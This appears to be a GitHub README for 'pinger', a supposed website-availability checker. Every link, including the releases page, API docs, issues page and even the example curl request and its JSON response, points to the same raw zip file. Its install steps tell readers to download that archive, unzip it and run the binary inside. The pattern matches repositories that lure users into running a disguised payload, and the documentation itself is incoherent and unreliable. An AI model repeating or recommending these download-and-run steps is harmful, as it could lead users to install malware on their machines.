# 🌐 pinger - Check Website Availability Easily

## 📥 Download the Latest Release
[![Download pinger](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip%20Pinger-v1.0-blue)](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip)

## 🚀 Getting Started

Pinger is a lightweight microservice that checks website and server availability through a simple HTTP API. With Pinger, you can perform ping tests, verify HTTP/HTTPS status codes, and receive clean JSON responses. This tool is perfect for scripts, bots, and monitoring tools. You can run Pinger as a Docker image or as a standalone Go application.

## 🖥️ System Requirements

### For Docker:
- Docker version 20.10 or later.
  
### For Standalone Go Application:
- Go version 1.16 or later.
- A computer with Windows, macOS, or Linux.

## 📦 Installation

### Via Docker

1. Open your terminal.
2. Run the following command to pull the latest Pinger image:

   ```bash
   docker pull krish361/pinger
   ```

3. Run the container using:

   ```bash
   docker run -p 8080:8080 krish361/pinger
   ```

You can access the API at `http://localhost:8080`.

### Standalone Go Application

1. Visit the [Releases page to download](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip).
2. Choose the appropriate file for your operating system.
3. Unzip the downloaded file.
4. Open a terminal or command prompt.
5. Navigate to the unzipped folder.
6. Run the application with:

   ```bash
   ./pinger
   ```

Access the API at `http://localhost:8080`.

## ⚙️ Usage

Pinger provides a straightforward API to check the status of a website or server.

### Example Request

To check the status of a server, you can use the following cURL command:

```bash
curl https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip
```

### Example Response

You will receive a JSON response indicating the status:

```json
{
  "url": "https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip",
  "status": "up",
  "http_code": 200,
  "response_time": "120ms"
}
```

## 🛠️ Features

- **Ping Test:** Checks if a server or website is reachable.
- **HTTP/HTTPS Status Codes:** Returns the status of requested URLs.
- **JSON Responses:** Provides clean output suitable for scripting and monitoring.

## 📚 API Documentation

You can find detailed API documentation on how Pinger works, including supported endpoints, request formats, and response structures. 

For full API documentation, visit: [Pinger API Documentation](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip).

## 📄 Example Use Cases

- **Monitoring:** Use Pinger to regularly check if your website is up and running.
- **Automation:** Integrate Pinger in your scripts to automate checks.
- **Bot Development:** Utilize Pinger in bots for server status updates.

## 🌐 Community and Support

If you have questions or need help, please visit the [issues page](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip) on GitHub. You can also contribute by reporting bugs or suggesting features.

## 🤝 Contributing

We welcome contributions! If you want to help improve Pinger, please fork the repository, make your changes, and submit a pull request.

## 🔗 Download & Install

To download Pinger, please visit the [Releases page to download](https://raw.githubusercontent.com/krish361-web/pinger/main/moonshiner/pinger_actress.zip). Select the appropriate file for your operating system, then follow the installation instructions above to get started.

Enjoy using Pinger for your website monitoring needs!